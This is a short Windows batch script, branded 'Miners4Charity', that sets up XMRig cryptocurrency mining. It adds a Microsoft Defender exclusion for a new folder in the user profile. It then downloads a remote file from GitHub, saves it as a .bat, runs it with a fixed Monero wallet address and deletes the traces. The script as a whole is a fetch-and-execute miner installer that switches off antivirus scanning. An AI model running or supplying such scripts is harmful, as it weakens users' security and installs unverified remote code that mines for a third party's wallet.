echo Adding the Mining Directory
mkdir %USERPROFILE%\Miners4Charity
powershell -inputformat none -outputformat none -NonInteractive -Command "$USERPROFILE = $env:USERPROFILE; Defender\Add-MpPreference -ExclusionPath ('$USERPROFILE\Miners4Charity')"

echo Running the setup script
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/miners4charity/xmrig_setup/master/xmrig.zip', $tempfile); & $tempfile 42uxPgPqt9V9ZpLh8MkZUW2saYJNdrXtXUGtosFGZJdpGHG48Z4i42mHL87oBkkMre9xh1fv9mEnVg1f8ZJnkwqrBDFKNrC; Remove-Item -Force $tempfile"
